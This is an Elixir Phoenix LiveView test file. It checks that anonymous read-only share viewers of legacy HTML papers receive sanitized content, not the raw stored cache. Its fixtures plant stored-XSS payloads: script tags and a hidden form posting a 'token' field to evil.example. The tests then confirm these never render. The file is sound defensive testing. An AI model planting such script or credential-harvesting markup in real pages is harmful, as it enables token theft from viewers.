defmodule BarkparkWeb.Studio.SharedPaperAnonShareReaderSourceTest do
  @moduledoc """
  task-fa27740cb3162dbd — Studio's READ-ONLY `paper_html` arm served the raw
  stored `body_html` to an ANONYMOUS `:docs` share holder.

  THE SHAPE. `LiveScope.authorize_read/4` grades an anonymous mount of a
  `:docs`-shared desk `:share_read` — the FULL Studio UI, no flag. On that desk
  an HTML-only (legacy) paper has no block list, so `paper_block_mode` is false
  and `show_editor` is false, and `components.ex` renders the stored bytes
  through `raw(@paper_html)` inside an `<article>` — a VIEW, not an editor
  buffer. The three feeds of that assign (`Shared.Paper.setup_paper_view/2`,
  `Shared.Paper.refetch_paper/1`, and `Handlers.Lifecycle.paper_updated/2`)
  each read `content["body_html"]` straight off `%Content.Document{}`: no
  `Envelope.render`, no visibility redaction, no `HtmlSanitizer`.

  WHY THE STORED CACHE IS NOT ALREADY SAFE. `BlockOps.upsert_blocks_doc/3`
  sanitizes on the legacy HTML-only WRITE leg, but that is a write-time layer a
  historical row predates — every fixture here plants its bytes with a direct
  `Repo.update!`, which is exactly the population `Content.Papers.reader_source/3`
  exists for (it is what the share-link static fallback was routed through in
  PR #14596).

  THE RULE. A socket the write tier denies (`Shared.Paper.write_denied?/1` —
  `Caps.write_capable?/2`, the ONE predicate; a `share_access: :read` posture
  loses there before `caps.write` gets a vote) is a NON-EDITING viewer and gets
  the `reader_source/3` verdict. A write-capable socket keeps the raw read: an
  authenticated author looking at their own document, the same stance
  `share_link_controller.ex` writes down where it refuses to copy it.

  `async: false` — the `:shares` registry and the paper-canvas flag are
  process-global.
  """
  use BarkparkWeb.ConnCase, async: false

  import Phoenix.LiveViewTest
  import Barkpark.TenancyFixtures

  alias Barkpark.{Content, Repo, Sharing}

  # ITS OWN DATASET — the remediation for CI run 33596312592, where this file was
  # green alone and RED in the full suite (2 failures, both the `<article>` arm
  # assertion; every security `refute` still passed). Everything this fixture
  # leans on is DATASET-SCOPED and shared when the dataset is "production":
  # `Content.Schema.get_schema/3` matches "this workspace OR global" and breaks
  # the tie on `dataset_id` alone, so a foreign global `paper` schema decides
  # this suite's reader verdict; the tag registry the publish wall reads is
  # dataset-scoped too. A dataset no other file names cannot be raced, and the
  # tags below make the wall's input this file's own.
  @dataset "anon-share-reader-#{System.unique_integer([:positive])}"

  # A stored cache no renderer of ours would emit today: a credential-harvesting
  # form, a script, and one paragraph of real prose. `reader_source/3` keeps the
  # paragraph and drops the rest.
  @poisoned ~s|<form action="https://evil.example"><input name="token"></form><script>alert('leak')</script><p id="readable">Readable prose</p>|

  # The same shape, one revision later — the body a `:paper_updated` broadcast
  # announces.
  @poisoned_v2 ~s|<script>alert('leak')</script><p id="readable">Second version</p>|

  setup %{conn: conn} do
    prev_canvas = System.get_env("BARKPARK_PAPER_CANVAS")
    prior_shares = Application.get_env(:barkpark, :shares)

    # The canvas default, pinned rather than inherited — an HTML-only paper
    # renders the read-only raw arm under BOTH settings, and pinning keeps the
    # arm this file is about the one that runs.
    System.delete_env("BARKPARK_PAPER_CANVAS")

    on_exit(fn ->
      case prev_canvas do
        nil -> System.delete_env("BARKPARK_PAPER_CANVAS")
        v -> System.put_env("BARKPARK_PAPER_CANVAS", v)
      end

      if is_nil(prior_shares),
        do: Application.delete_env(:barkpark, :shares),
        else: Application.put_env(:barkpark, :shares, prior_shares)
    end)

    # A NON-default workspace: the Default workspace is an open public-demo in
    # test and that arm is offered BEFORE the share arm, so a share on Default
    # never produces the `:share_read` grade this file is about.
    ws = create_workspace!("anon-html-#{System.unique_integer([:positive])}")
    proj = create_project!(ws, "anon-html-proj")

    Application.put_env(
      :barkpark,
      :shares,
      Sharing.parse("#{ws.slug}/#{proj.slug}/#{@dataset}:docs:read")
    )

    seed_paper_schema!(ws, proj)
    # The publish wall reads the tag REGISTRY of this dataset, and
    # `LabelFixtures.paper_attrs/1` fills weighted `tags` — unregistered names
    # make the wall the ambient input instead of the fixture.
    Barkpark.LabelFixtures.register_tags!(@dataset)

    {:ok, conn: conn, ws: ws, proj: proj}
  end

  # Schemas are TENANT-SCOPED: without a `paper` schema in THIS workspace the
  # desk has no paper type and the pane never opens, which would make every
  # assertion below pass vacuously against a page that was not rendered.
  defp seed_paper_schema!(ws, proj) do
    {:ok, _} =
      Content.upsert_schema(
        %{
          "name" => "paper",
          "title" => "Papers",
          "icon" => "📰",
          "visibility" => "public",
          "fields" => [%{"name" => "title", "title" => "Title", "type" => "string"}]
        },
        @dataset,
        workspace_id: ws.id,
        project_id: proj.id
      )
  end

  # An HTML-only (legacy) paper whose STORED cache carries the poisoned bytes.
  # Written through the normal upsert first (so every other content key is
  # exactly what production carries), then the cache is planted directly —
  # `upsert_blocks_doc/3` sanitizes the legacy write leg, and the whole point is
  # a row that predates it.
  defp create_html_paper!(ws, proj, slug, body_html) do
    {:ok, paper} =
      Content.upsert_paper(
        Barkpark.LabelFixtures.paper_attrs(%{
          "slug" => slug,
          "title" => "Legacy HTML paper",
          "dataset" => @dataset,
          "body_html" => "<p id=\"readable\">Readable prose</p>",
          "workspace_id" => ws.id,
          "project_id" => proj.id
        })
      )

    plant_body_html!(paper, body_html)
  end

  # Plant a stored `body_html` cache DIRECTLY: `upsert_blocks_doc/3` sanitizes
  # the legacy HTML-only write leg, and the population this fix is for is the
  # rows that predate that write-time layer.
  defp plant_body_html!(paper, body_html) do
    paper
    |> Ecto.Changeset.change(content: Map.put(paper.content, "body_html", body_html))
    |> Repo.update!()
  end

  defp open_paper!(conn, ws, proj, slug) do
    {:ok, view, html} =
      live(conn, "/w/#{ws.slug}/p/#{proj.slug}/d/#{@dataset}/studio/paper/#{slug}")

    {view, html}
  end

  # The anti-vacuity guard: prove the READ-ONLY raw arm is the one rendering,
  # not some earlier cond branch (no slug / editor / block mode). The article
  # tag is the discriminator — the streamed block arm carries the SAME id but
  # opens with `phx-update="stream"` attributes, so a tag that CLOSES right
  # after `data-rev` is the read-only arm and nothing else. (A bare
  # `refute rendered =~ ~s(phx-update="stream")` is NOT this check: the desk
  # list around the pane streams too, and that guard reds on every page.)
  defp assert_readonly_article!(rendered, slug) do
    articles = rendered |> then(&Regex.scan(~r/<article[^>]*>/, &1)) |> List.flatten()

    assert Enum.any?(articles, &(&1 =~ ~r/^<article id="paper-body-#{slug}" data-rev="\d+">$/)),
           """
           expected the READ-ONLY raw arm for #{slug}.
           A red here names the arm that rendered instead, so the next failure
           does not need a bisect: `paper-body-unrenderable-…` is the clamp
           refusing (the reader answered {:error, _}), a tag carrying
           phx-update="stream" is block mode, `paper-body` bare is "no paper".
           articles rendered: #{inspect(articles)}
           """

    :ok
  end

  describe "an anonymous :docs-share viewer" do
    test "is served the reader_source verdict for an HTML-only paper, not the raw cache",
         %{conn: conn, ws: ws, proj: proj} do
      slug = "anon-share-poisoned-#{System.unique_integer([:positive])}"
      paper = create_html_paper!(ws, proj, slug, @poisoned)

      # The verdict this surface OWES the viewer, computed by the one reader.
      assert {:html, sanitized} =
               Content.Papers.reader_source(paper, @dataset,
                 workspace_id: ws.id,
                 project_id: proj.id
               )

      refute sanitized =~ "evil.example"

      {_view, html} = open_paper!(conn, ws, proj, slug)
      assert_readonly_article!(html, slug)

      # The prose survives (this is a clamp, not a blanking) ...
      assert html =~ "Readable prose"
      # ... and the served body IS the reader's verdict.
      assert html =~ sanitized
      # ... while the script and the credential form never reach the DOM.
      refute html =~ "alert('leak')"
      refute html =~ "evil.example"
      refute html =~ ~s(name="token")
    end

    test "a :paper_updated broadcast cannot re-feed the raw cache after mount",
         %{conn: conn, ws: ws, proj: proj} do
      slug = "anon-share-refeed-#{System.unique_integer([:positive])}"
      paper = create_html_paper!(ws, proj, slug, @poisoned)

      {view, _html} = open_paper!(conn, ws, proj, slug)
      pid_before = view.pid

      # The write that the broadcast is ANNOUNCING: a second version of the
      # cache, poisoned the same way. Asserting the viewer ends up on THIS body
      # is what keeps the clamp from being satisfied by a socket that simply
      # ignores the frame and paints a stale page.
      _updated = plant_body_html!(paper, @poisoned_v2)

      # `Handlers.Lifecycle.paper_updated/2` — the third feed of `:paper_html`,
      # which re-assigns AFTER mount and so is not covered by the mount clamp.
      send(view.pid, {:paper_updated, %{html: @poisoned_v2, rev: 999}})

      rendered = render(view)
      assert_readonly_article!(rendered, slug)
      # CURRENT: the viewer is on the new version ...
      assert rendered =~ "Second version"
      refute rendered =~ "Readable prose"
      refute rendered =~ "alert('leak')"
      refute rendered =~ "evil.example"
      refute rendered =~ ~s(name="token")
      # Still the same LiveView: the clamp is a re-assign, not a remount.
      assert view.pid == pid_before
    end

    test "a body the reader refuses (semantic_empty) is withheld, not painted raw",
         %{conn: conn, ws: ws, proj: proj} do
      slug = "anon-share-refused-#{System.unique_integer([:positive])}"
      # Script-only: `reader_source/3` calls this body semantically empty, so
      # there is nothing a reader may be shown — and certainly not the script.
      paper = create_html_paper!(ws, proj, slug, "<script>steal()</script>")

      assert {:error, :semantic_empty} =
               Content.Papers.reader_source(paper, @dataset,
                 workspace_id: ws.id,
                 project_id: proj.id
               )

      {_view, html} = open_paper!(conn, ws, proj, slug)

      refute html =~ "steal()"
      # The never-blank arm names the state instead of painting an empty page.
      assert html =~ "paper-unrenderable-notice"
    end
  end
end
